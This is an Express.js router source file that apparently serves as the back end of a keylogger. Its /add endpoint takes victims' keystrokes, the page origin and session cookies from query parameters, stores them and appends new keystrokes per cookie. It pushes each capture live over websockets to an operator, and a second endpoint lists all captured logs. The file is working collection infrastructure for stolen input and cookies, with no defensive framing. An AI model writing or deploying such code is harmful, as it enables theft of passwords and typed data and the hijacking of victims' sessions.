var Keylog = require('../../models/keylog');
var router = require('express').Router();
var ws = require('../../websockets');

router.get('/', function (req, res, next) {
    Keylog.find()
    .sort('-date')
    .exec(function (err, logs) {
        if (err) {
            console.log(err);
            return next(err);
        }
        return res.status(200).json(logs);
    });
});

router.get('/add', function(req, res, next) {
    var keylog = new Keylog({
        date: new Date().valueOf(),
        origin: req.query.origin,
        value: req.query.value,
        cookie: req.query.cookie
    });

    Keylog.where('cookie').equals(req.query.cookie)
        .exec(function(err, doc) {

            if (!doc.length) {
                keylog.save(function(e, d) {
                    if (e) {
                        console.log(e);
                        return next(e);
                    }
                    ws.broadcast('new_keylog', keylog);
                    return res.status(201).json(d);
                });
            } else {
                Keylog.update({cookie: req.query.cookie},
                    { value: doc[0].value + req.query.value },
                    {},
                    function(e, d) {
                        if (e) {
                            console.log(e);
                            return next(e);
                        }
                        keylog.value = doc[0].value + req.query.value;
                        ws.broadcast('updated_keylog', keylog);
                        return res.status(200).json(d);
                    });
            }
        });
});

module.exports = router;
